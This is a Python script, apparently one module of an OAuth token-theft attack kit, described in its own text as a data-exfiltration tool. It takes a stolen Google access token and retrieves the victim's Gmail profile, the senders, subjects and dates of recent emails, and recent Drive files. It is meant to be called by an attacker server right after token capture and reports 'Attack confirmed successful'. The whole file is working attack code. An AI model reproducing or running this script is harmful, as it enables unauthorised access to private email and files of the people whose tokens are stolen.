"""
Automated Data Exfiltration Module
===================================
Uses a stolen access token to pull real victim data from Google APIs.
Demonstrates the attack worked — no malware needed, just the OAuth token.

Usage (called internally after token capture, or run standalone):
    python exfiltrator.py <access_token>
"""

import sys
import json
import requests


GMAIL_API   = "https://gmail.googleapis.com/gmail/v1/users/me"
DRIVE_API   = "https://www.googleapis.com/drive/v3"


def _headers(access_token: str) -> dict:
    return {"Authorization": f"Bearer {access_token}"}


def get_profile(access_token: str) -> dict:
    """Pull basic victim profile info."""
    try:
        r = requests.get(f"{GMAIL_API}/profile", headers=_headers(access_token), timeout=8)
        if r.status_code == 200:
            d = r.json()
            return {
                "type": "profile",
                "email": d.get("emailAddress", "unknown"),
                "total_messages": d.get("messagesTotal", 0),
                "total_threads": d.get("threadsTotal", 0),
            }
        return {"type": "profile", "error": f"HTTP {r.status_code}"}
    except Exception as e:
        return {"type": "profile", "error": str(e)}


def get_last_emails(access_token: str, count: int = 5) -> list:
    """Pull subject + sender of the last N emails."""
    results = []
    try:
        # List message IDs
        r = requests.get(
            f"{GMAIL_API}/messages",
            headers=_headers(access_token),
            params={"maxResults": count, "labelIds": "INBOX"},
            timeout=8
        )
        if r.status_code != 200:
            return [{"type": "email", "error": f"list failed: HTTP {r.status_code}"}]

        message_ids = [m["id"] for m in r.json().get("messages", [])]

        for mid in message_ids:
            mr = requests.get(
                f"{GMAIL_API}/messages/{mid}",
                headers=_headers(access_token),
                params={"format": "metadata", "metadataHeaders": ["Subject", "From", "Date"]},
                timeout=8
            )
            if mr.status_code == 200:
                headers = {
                    h["name"]: h["value"]
                    for h in mr.json().get("payload", {}).get("headers", [])
                }
                results.append({
                    "type": "email",
                    "subject": headers.get("Subject", "(no subject)"),
                    "from":    headers.get("From", "unknown"),
                    "date":    headers.get("Date", "unknown"),
                    "id":      mid,
                })
    except Exception as e:
        results.append({"type": "email", "error": str(e)})
    return results


def get_drive_files(access_token: str, count: int = 5) -> list:
    """List recent Drive files — proves file access."""
    results = []
    try:
        r = requests.get(
            f"{DRIVE_API}/files",
            headers=_headers(access_token),
            params={
                "pageSize": count,
                "orderBy": "modifiedTime desc",
                "fields": "files(id,name,mimeType,modifiedTime,size)"
            },
            timeout=8
        )
        if r.status_code != 200:
            return [{"type": "drive", "error": f"HTTP {r.status_code}"}]
        for f in r.json().get("files", []):
            results.append({
                "type":     "drive",
                "name":     f.get("name"),
                "mime":     f.get("mimeType", "").split(".")[-1],
                "modified": f.get("modifiedTime", "")[:10],
                "size_kb":  round(int(f.get("size", 0)) / 1024, 1) if f.get("size") else "N/A",
            })
    except Exception as e:
        results.append({"type": "drive", "error": str(e)})
    return results


def run_full_exfil(access_token: str) -> list:
    """
    Run all exfiltration modules and return combined results.
    Called by attacker_server.py right after token capture.
    """
    data = []
    data.append(get_profile(access_token))
    data.extend(get_last_emails(access_token, count=5))
    data.extend(get_drive_files(access_token, count=5))
    return data


# ── Standalone CLI runner ────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python exfiltrator.py <access_token>")
        sys.exit(1)

    token = sys.argv[1]
    print("\n[*] Running data exfiltration with provided access token...\n")

    results = run_full_exfil(token)
    for item in results:
        print(json.dumps(item, indent=2))

    print(f"\n[+] Exfiltrated {len(results)} records. Attack confirmed successful.")
